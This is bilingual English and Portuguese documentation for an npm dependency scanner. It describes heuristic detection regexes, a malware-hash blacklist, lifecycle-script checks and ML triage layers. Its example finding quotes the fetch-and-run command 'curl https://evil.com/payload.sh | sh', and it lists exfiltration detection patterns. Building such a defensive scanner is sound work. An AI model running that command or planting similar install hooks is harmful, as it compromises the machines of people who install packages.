# Local Scan API

Documentation for the local node_modules scanning module.

---

## English

### Overview

The `scan-local.js` module performs heuristic scanning of `node_modules` to detect suspicious code patterns, known malware hashes, and suspicious lifecycle scripts. It implements Layer 1 of the ML triage system and integrates with ML triage for Layers 2 and 3.

### Main Function

#### `scanLocal(projectRoot, projectConfig, options)`

Scans the `node_modules` directory of a project for security threats.

**Parameters:**

- `projectRoot` (string): Absolute path to the project root directory
- `projectConfig` (object): Project configuration from `.npm-verify.json`
  - `allowPackages` (string[]): Package names to skip
  - `ignorePaths` (string[]): Glob patterns to ignore
  - `heuristics.maxFileSizeKb` (number): Maximum file size to scan (default: 512)
  - `ml` (object): ML configuration
- `options` (object): Scan options
  - `mlConfig` (object): Merged ML configuration
  - `deepScan` (boolean): Enable Layer 3 deep scan (default: false)

**Returns:** `Promise<Array>` - Array of finding objects

**Finding Object Structure:**

```javascript
{
  severity: 'high' | 'medium' | 'low',
  source: 'local',
  rule: string,           // Rule ID (e.g., 'eval-usage')
  package: string,         // Package name
  file: string,            // Relative file path
  detail: string,          // Human-readable description
  snippet: string,         // Matching code snippet (optional)
  blocking: boolean        // Whether this should block execution
}
```

**Example:**

```javascript
import { scanLocal } from './lib/scan-local.js';

const findings = await scanLocal('/path/to/project', projectConfig, {
  mlConfig: { enabled: true, layer2Threshold: 0.7 },
  deepScan: false,
});

console.log(`Found ${findings.length} threats`);
```

### Heuristic Rules (Layer 1)

The following heuristic rules are applied to all scannable files:

| Rule ID                | Severity | Pattern                                                                           | Description                                               |
| ---------------------- | -------- | --------------------------------------------------------------------------------- | --------------------------------------------------------- |
| `eval-usage`           | high     | `/\beval\s*\(/`                                                                   | Dynamic eval() detected                                   |
| `function-constructor` | high     | `/new\s+Function\s*\(/`                                                           | Function constructor with dynamic code                    |
| `base64-buffer`        | medium   | `/Buffer\.from\s*\(\s*['"`][A-Za-z0-9+/=]{80,}['"`]\s*,\s*['"`]base64['"`]\s*\)/` | Large base64-encoded buffer                               |
| `env-exfiltration`     | high     | `/process\.env[\s\S]{0,200}(?:fetch\s*\(                                          | https?\.request\s*\()/`                                   | Possible environment variable exfiltration |
| `obfuscated-url`       | medium   | `/(?:atob                                                                         | Buffer\.from)\s*\([\s\S]{0,80}\)[\s\S]{0,80}(?:fetch\s*\( | https?\.request\s*\()/`                    | Possible obfuscated outbound request |

### Malware Hash Detection

Files are checked against a SHA-256 blacklist loaded from `data/malware-hashes.json`.

**Finding:**

```javascript
{
  severity: 'high',
  source: 'local',
  rule: 'known-malware-hash',
  package: 'malicious-package',
  file: 'index.js',
  detail: 'File hash matches known malware list (abc123...)',
  blocking: true
}
```

### Lifecycle Script Scanning

The module scans `package.json` files in dependencies for suspicious lifecycle scripts:

**Lifecycle Scripts Checked:**

- `preinstall`
- `install`
- `postinstall`
- `preprepare`
- `prepare`

**Suspicious Patterns:** `curl`, `wget`, `powershell`, `Invoke-WebRequest`, `https://`, `eval`, `base64`

**Finding:**

```javascript
{
  severity: 'medium',
  source: 'local',
  rule: 'suspicious-lifecycle-script',
  package: 'package-name',
  file: 'package-name/package.json',
  detail: 'Suspicious postinstall script in dependency',
  snippet: 'curl https://evil.com/payload.sh | sh',
  blocking: false
}
```

### Scannable File Extensions

Only files with the following extensions are scanned:

- `.js`
- `.mjs`
- `.cjs`
- `.json`

### ML Integration

If ML is enabled in the configuration, findings from Layer 1 are passed to the ML triage system for Layers 2 and 3 analysis.

**Flow:**

1. Layer 1 findings are generated
2. File content is tokenized and vectorized (TF-IDF)
3. Naive Bayes classification (Layer 2)
4. Optional ONNX CodeBERT classification (Layer 3) if `deepScan: true`
5. Final findings aggregated from all layers

### Configuration Options

**Project Config (`.npm-verify.json`):**

```json
{
  "allowPackages": ["node-gyp", "some-safe-package"],
  "ignorePaths": ["**/test/**", "**/docs/**", "**/.bin/**"],
  "heuristics": {
    "maxFileSizeKb": 512
  },
  "ml": {
    "enabled": true,
    "layer2Threshold": 0.7,
    "layer3Threshold": 0.8,
    "deepScanOnInstall": false
  }
}
```

---

## Português

### Visão Geral

O módulo `scan-local.js` realiza varredura heurística de `node_modules` para detectar padrões de código suspeitos, hashes de malware conhecidos e scripts de ciclo de vida suspeitos. Implementa a Camada 1 do sistema de triagem ML e integra com triagem ML para Camadas 2 e 3.

### Função Principal

#### `scanLocal(projectRoot, projectConfig, options)`

Varre o diretório `node_modules` de um projeto em busca de ameaças de segurança.

**Parâmetros:**

- `projectRoot` (string): Caminho absoluto para o diretório raiz do projeto
- `projectConfig` (object): Configuração do projeto de `.npm-verify.json`
  - `allowPackages` (string[]): Nomes de pacotes para pular
  - `ignorePaths` (string[]): Padrões glob para ignorar
  - `heuristics.maxFileSizeKb` (number): Tamanho máximo de arquivo para varrer (padrão: 512)
  - `ml` (object): Configuração ML
- `options` (object): Opções de varredura
  - `mlConfig` (object): Configuração ML mesclada
  - `deepScan` (boolean): Habilita varredura profunda da Camada 3 (padrão: false)

**Retorna:** `Promise<Array>` - Array de objetos de finding

**Estrutura do Objeto Finding:**

```javascript
{
  severity: 'high' | 'medium' | 'low',
  source: 'local',
  rule: string,           // ID da regra (ex: 'eval-usage')
  package: string,         // Nome do pacote
  file: string,            // Caminho relativo do arquivo
  detail: string,          // Descrição legível por humanos
  snippet: string,         // Snippet de código correspondente (opcional)
  blocking: boolean        // Se isso deve bloquear execução
}
```

**Exemplo:**

```javascript
import { scanLocal } from './lib/scan-local.js';

const findings = await scanLocal('/caminho/para/projeto', projectConfig, {
  mlConfig: { enabled: true, layer2Threshold: 0.7 },
  deepScan: false,
});

console.log(`Encontradas ${findings.length} ameaças`);
```

### Regras Heurísticas (Camada 1)

As seguintes regras heurísticas são aplicadas a todos os arquivos escaneáveis:

| ID da Regra            | Severidade | Padrão                                                                            | Descrição                                                 |
| ---------------------- | ---------- | --------------------------------------------------------------------------------- | --------------------------------------------------------- |
| `eval-usage`           | high       | `/\beval\s*\(/`                                                                   | eval() dinâmico detectado                                 |
| `function-constructor` | high       | `/new\s+Function\s*\(/`                                                           | Construtor Function com código dinâmico                   |
| `base64-buffer`        | medium     | `/Buffer\.from\s*\(\s*['"`][A-Za-z0-9+/=]{80,}['"`]\s*,\s*['"`]base64['"`]\s*\)/` | Buffer codificado em base64 grande                        |
| `env-exfiltration`     | high       | `/process\.env[\s\S]{0,200}(?:fetch\s*\(                                          | https?\.request\s*\()/`                                   | Possível exfiltração de variável de ambiente |
| `obfuscated-url`       | medium     | `/(?:atob                                                                         | Buffer\.from)\s*\([\s\S]{0,80}\)[\s\S]{0,80}(?:fetch\s*\( | https?\.request\s*\()/`                      | Possível requisição de saída ofuscada |

### Detecção de Hash de Malware

Arquivos são verificados contra uma blacklist SHA-256 carregada de `data/malware-hashes.json`.

**Finding:**

```javascript
{
  severity: 'high',
  source: 'local',
  rule: 'known-malware-hash',
  package: 'malicious-package',
  file: 'index.js',
  detail: 'Hash de arquivo corresponde à lista de malware conhecido (abc123...)',
  blocking: true
}
```

### Varredura de Script de Ciclo de Vida

O módulo varre arquivos `package.json` em dependências em busca de scripts de ciclo de vida suspeitos:

**Scripts de Ciclo de Vida Verificados:**

- `preinstall`
- `install`
- `postinstall`
- `preprepare`
- `prepare`

**Padrões Suspeitos:** `curl`, `wget`, `powershell`, `Invoke-WebRequest`, `https://`, `eval`, `base64`

**Finding:**

```javascript
{
  severity: 'medium',
  source: 'local',
  rule: 'suspicious-lifecycle-script',
  package: 'package-name',
  file: 'package-name/package.json',
  detail: 'Script postinstall suspeito em dependência',
  snippet: 'curl https://evil.com/payload.sh | sh',
  blocking: false
}
```

### Extensões de Arquivo Escaneáveis

Apenas arquivos com as seguintes extensões são varridos:

- `.js`
- `.mjs`
- `.cjs`
- `.json`

### Integração ML

Se ML estiver habilitado na configuração, findings da Camada 1 são passados para o sistema de triagem ML para análise das Camadas 2 e 3.

**Fluxo:**

1. Findings da Camada 1 são gerados
2. Conteúdo do arquivo é tokenizado e vetorizado (TF-IDF)
3. Classificação Naive Bayes (Camada 2)
4. Classificação opcional ONNX CodeBERT (Camada 3) se `deepScan: true`
5. Findings finais agregados de todas as camadas

### Opções de Configuração

**Config de Projeto (`.npm-verify.json`):**

```json
{
  "allowPackages": ["node-gyp", "some-safe-package"],
  "ignorePaths": ["**/test/**", "**/docs/**", "**/.bin/**"],
  "heuristics": {
    "maxFileSizeKb": 512
  },
  "ml": {
    "enabled": true,
    "layer2Threshold": 0.7,
    "layer3Threshold": 0.8,
    "deepScanOnInstall": false
  }
}
```
